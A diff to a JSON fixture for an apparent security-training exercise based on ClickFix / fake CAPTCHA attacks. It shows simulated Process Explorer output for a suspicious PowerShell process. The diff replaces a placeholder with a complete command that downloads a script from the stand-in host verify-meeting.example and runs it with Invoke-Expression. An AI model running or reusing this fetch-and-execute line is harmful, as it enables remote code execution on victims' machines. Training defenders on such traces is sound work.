@@ -23,7 +23,7 @@
       "id": "pe",
       "name": "Process Explorer",
       "description": "実行Path・Command Line・親Process・ロード済みDLLを確認します。",
-      "output": "Parent: explorer.exe (1800)\nPID: 4200\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommand line: powershell.exe -NoProfile -Command \"iwr https://verify-meeting.example/check.ps1; <TRAINING-PLACEHOLDER:取得Scriptの実行>\"\nUser: ASTER\\mori\nLoaded DLLs (抜粋):\nC:\\Windows\\System32\\kernel32.dll",
+      "output": "Parent: explorer.exe (1800)\nPID: 4200\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommand line: powershell.exe -NoProfile -Command \"$response = iwr https://verify-meeting.example/check.ps1; Invoke-Expression -Command $response.Content\"\nUser: ASTER\\mori\nLoaded DLLs (抜粋):\nC:\\Windows\\System32\\kernel32.dll",
       "accepted_information_types": [
         "pid"
       ],
@@ -92,6 +92,6 @@
   "sources": [
     "https://attack.mitre.org/techniques/T1204/004/"
   ],
-  "fixture_note": "組織・Domain・IP・Package・Hash・記録は架空の保存済み教材。IPは文書用アドレスで、RDAP・外部評判も実照会ではない。時刻は2026-08-18を基準とし、出力は必要なフィールドの抜粋。攻撃コマンドのPayloadは<TRAINING-PLACEHOLDER>に置換。 各問題は独立した端末・案件のSnapshot。PID・時刻の再利用は問題間の関連を意味しない。時刻はZ表記以外すべてJST。",
+  "fixture_note": "組織・Domain・IP・Package・Hash・記録は架空の保存済み教材。IPは文書用アドレスで、RDAP・外部評判も実照会ではない。時刻は2026-08-18を基準とし、出力は必要なフィールドの抜粋。実行可能なPayloadは配布しない。 各問題は独立した端末・案件のSnapshot。PID・時刻の再利用は問題間の関連を意味しない。時刻はZ表記以外すべてJST。",
   "inspired_by": "ClickFix / Fake CAPTCHA"
 }
